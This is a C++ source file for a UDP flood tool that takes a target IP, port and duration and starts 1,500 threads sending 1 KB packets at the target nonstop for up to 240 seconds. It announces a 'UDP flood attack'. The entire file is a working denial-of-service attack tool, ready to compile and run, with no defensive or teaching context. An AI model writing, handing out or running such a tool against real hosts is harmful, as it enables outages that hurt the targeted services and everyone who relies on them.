#include <iostream>
#include <thread>
#include <vector>
#include <chrono>
#include <cstdlib>
#include <cstring>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/socket.h>

#define MAX_THREADS 1500
#define MAX_DURATION 240  // Max attack time in seconds
#define PACKET_SIZE 1024  // 1KB UDP packet

using namespace std;

bool attack_running = true;

void send_udp_packets(const char* target_ip, int target_port) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        cerr << "❌ Socket creation failed!" << endl;
        return;
    }

    sockaddr_in server_addr{};
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(target_port);
    inet_pton(AF_INET, target_ip, &server_addr.sin_addr);

    char packet_data[PACKET_SIZE];
    memset(packet_data, rand() % 256, sizeof(packet_data));

    while (attack_running) {
        sendto(sock, packet_data, sizeof(packet_data), 0, (sockaddr*)&server_addr, sizeof(server_addr));
    }

    close(sock);
}

int main(int argc, char* argv[]) {
    if (argc != 4) {
        cout << "⚠️ Usage: ./udp_flood <IP> <PORT> <DURATION>\n";
        return 1;
    }

    const char* ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);

    // ✅ Ensure duration is within allowed range (max 240 sec)
    if (duration > MAX_DURATION) {
        duration = MAX_DURATION;
    }

    cout << "🚀 Starting UDP flood attack on " << ip << ":" << port 
         << " for " << duration << " seconds...\n";

    vector<thread> threads;
    for (int i = 0; i < MAX_THREADS; i++) {
        threads.emplace_back(send_udp_packets, ip, port);
    }

    this_thread::sleep_for(chrono::seconds(duration));
    attack_running = false;

    for (auto& th : threads) {
        th.join();
    }

    cout << "✅ Attack finished!\n";
    return 0;
}
